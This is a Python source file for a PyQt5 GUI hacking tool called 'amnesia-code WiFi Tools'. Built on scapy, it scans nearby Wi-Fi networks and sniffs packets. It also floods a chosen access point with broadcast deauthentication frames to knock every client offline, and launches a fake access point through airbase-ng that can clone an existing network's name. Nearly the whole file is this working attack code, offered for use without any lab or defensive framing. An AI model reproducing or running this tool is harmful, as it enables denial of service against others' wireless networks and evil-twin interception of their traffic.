import sys
import time
import subprocess
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QListWidget, QMessageBox, QProgressBar, QInputDialog, QMainWindow, QLabel
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QPalette
from scapy.all import *
from threading import Event

INTERFACE = input("Enter the name of your wireless interface (monitor mode required)  =>  ")
networks = {}

CHANNELS = list(range(1, 15))

def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        bssid = pkt[Dot11].addr2
        try:
            ssid = pkt[Dot11Elt].info.decode('utf-8')
        except UnicodeDecodeError:
            ssid = "<SSID decoding error>"

        if bssid not in networks:
            networks[bssid] = ssid

class ScanThread(QThread):
    finished = pyqtSignal()

    def run(self):
        start_time = time.time()
        for channel in CHANNELS:
            if time.time() - start_time > 10:
                break
            self.change_channel(channel)
            sniff(iface=INTERFACE, prn=packet_handler, timeout=2)
        self.finished.emit()

    def change_channel(self, channel):
        subprocess.call(f"iw dev {INTERFACE} set channel {channel}", shell=True)

class DeauthThread(QThread):
    progress = pyqtSignal(int)
    finished = pyqtSignal()

    def __init__(self, target_bssid, packet_count, interval):
        super().__init__()
        self.target_bssid = target_bssid
        self.packet_count = packet_count
        self.interval = interval

    def run(self):
        deauth_packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Deauth()
        for i in range(self.packet_count):
            sendp(deauth_packet, iface=INTERFACE, verbose=False)
            self.progress.emit(i + 1)
            time.sleep(self.interval)
        self.finished.emit()

class FakeAPThread(QThread):
    def __init__(self, ssid, interface):
        super().__init__()
        self.ssid = ssid
        self.interface = interface
        self.process = None

    def run(self):
        self.process = subprocess.Popen(["airbase-ng", "-e", self.ssid, self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def stop(self):
        if self.process:
            self.process.terminate()

class SniffThread(QThread):
    packet_captured = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self):
        super().__init__()
        self.stop_sniffing = Event()

    def run(self):
        sniff(iface=INTERFACE, prn=self.handle_packet, stop_filter=self.should_stop)

    def handle_packet(self, pkt):
        self.packet_captured.emit(pkt.summary())

    def should_stop(self, pkt):
        return self.stop_sniffing.is_set()

    def stop(self):
        self.stop_sniffing.set()

class SplashScreen(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Loading amnesia-code Wireless Tools...")
        self.setGeometry(300, 300, 400, 300)

        layout = QVBoxLayout()
        label = QLabel(self)
        label.setText("Loading...")

        layout.addWidget(label)
        self.setLayout(layout)

class WifiScannerApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("😈---amnesia-code WiFi Tools---😈")
        self.setGeometry(300, 300, 600, 500)
        palette = QPalette()
        gradient = "background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:0, stop:0 rgba(63, 94, 251, 255), stop:1 rgba(252, 70, 107, 255));"
        self.setStyleSheet(gradient)
        layout = QVBoxLayout()
        self.menu_label = QLabel("Main Menu: Choose an action")
        layout.addWidget(self.menu_label)

        self.scan_button = QPushButton("Scan Wi-Fi")
        self.scan_button.clicked.connect(self.start_scan)
        layout.addWidget(self.scan_button)

        self.deauth_button = QPushButton("Deauthentication (force everyone to disconnect from a Wi-Fi)")
        self.deauth_button.clicked.connect(self.deauth_menu)
        layout.addWidget(self.deauth_button)

        self.sniff_button = QPushButton("Packet Sniffer")
        self.sniff_button.clicked.connect(self.start_sniffing)
        layout.addWidget(self.sniff_button)

        self.fake_ap_button = QPushButton("Fake AP (Copy an existing Wi-Fi or create a new one)")
        self.fake_ap_button.clicked.connect(self.fake_ap_menu)
        layout.addWidget(self.fake_ap_button)

        self.networks_list = QListWidget()
        layout.addWidget(self.networks_list)

        self.sniffed_packets_list = QListWidget()
        self.sniffed_packets_list.setWindowTitle("Sniffed Packets")
        layout.addWidget(self.sniffed_packets_list)

        self.stop_sniff_button = QPushButton("Stop Sniffing")
        self.stop_sniff_button.setEnabled(False)
        self.stop_sniff_button.setStyleSheet("background-color: red; color: white;")
        self.stop_sniff_button.clicked.connect(self.stop_sniffing)
        layout.addWidget(self.stop_sniff_button)

        self.progress_bar = QProgressBar()
        self.progress_bar.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.progress_bar)

        central_widget = QWidget()
        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)
        self.scan_thread = None
        self.deauth_thread = None
        self.sniff_thread = None
        self.fake_ap_thread = None

    def start_scan(self):
        self.networks_list.clear()
        networks.clear()
        self.scan_button.setEnabled(False)

        self.scan_thread = ScanThread()
        self.scan_thread.finished.connect(self.show_networks)
        self.scan_thread.start()

    def show_networks(self):
        for bssid, ssid in networks.items():
            self.networks_list.addItem(f"SSID: {ssid} | BSSID: {bssid}")
        self.scan_button.setEnabled(True)

    def deauth_menu(self):
        selected_item = self.networks_list.currentItem()
        if not selected_item:
            QMessageBox.warning(self, "Bro ?", "Select a network from the list.")
            return
        target_bssid = selected_item.text().split("BSSID: ")[1]

        packet_count, ok1 = QInputDialog.getInt(self, "Packet Count ?", "Enter the number of packets:", value=1000)
        interval, ok2 = QInputDialog.getDouble(self, "Packet Interval ?", "Enter the interval in seconds:", value=0.1)

        if ok1 and ok2:
            self.progress_bar.setValue(0)
            self.progress_bar.setMaximum(packet_count)
            self.start_deauth(target_bssid, packet_count, interval)

    def start_deauth(self, target_bssid, packet_count, interval):
        self.deauth_thread = DeauthThread(target_bssid, packet_count, interval)
        self.deauth_thread.progress.connect(self.progress_bar.setValue)
        self.deauth_thread.finished.connect(lambda: QMessageBox.information(self, "Finished !", f"{packet_count} packets sent."))
        self.deauth_thread.start()

    def start_sniffing(self):
        self.sniffed_packets_list.clear()
        self.sniff_thread = SniffThread()
        self.sniff_thread.packet_captured.connect(self.add_sniffed_packet)
        self.sniff_thread.finished.connect(lambda: QMessageBox.information(self, "Sniffing Finished !", "Sniffing has been stopped...why ?"))
        self.stop_sniff_button.setEnabled(True)
        self.sniff_thread.start()

    def add_sniffed_packet(self, packet_summary):
        self.sniffed_packets_list.addItem(packet_summary)

    def stop_sniffing(self):
        if self.sniff_thread:
            self.sniff_thread.stop()
            self.sniff_thread.finished.emit()
        self.stop_sniff_button.setEnabled(False)

    def fake_ap_menu(self):
        option, ok = QInputDialog.getItem(self, "😈Fake AP😈", "Choose an option:", ["Copy an existing network", "Create a new network"], 0, False)
        if ok:
            if option == "Copy an existing network":
                selected_item = self.networks_list.currentItem()
                if not selected_item:
                    QMessageBox.warning(self, "Bruh Bruh ???", "Select a network from the list.")
                    return
                ssid = selected_item.text().split("SSID: ")[1].split(" |")[0]
            else:
                ssid, ok = QInputDialog.getText(self, "Fake AP Name", "Enter the name of the Fake AP:")
                if not ok:
                    return

            self.fake_ap_thread = FakeAPThread(ssid, INTERFACE)
            self.fake_ap_thread.start()
            QMessageBox.information(self, "Fake AP", f"The Fake AP '{ssid}' is being created....😈")

if __name__ == "__main__":
    app = QApplication(sys.argv)

    splash = SplashScreen()
    splash.show()

    window = WifiScannerApp()

    def show_main_window():
        splash.close()
        window.show()

    QTimer.singleShot(3000, show_main_window)

    sys.exit(app.exec_())
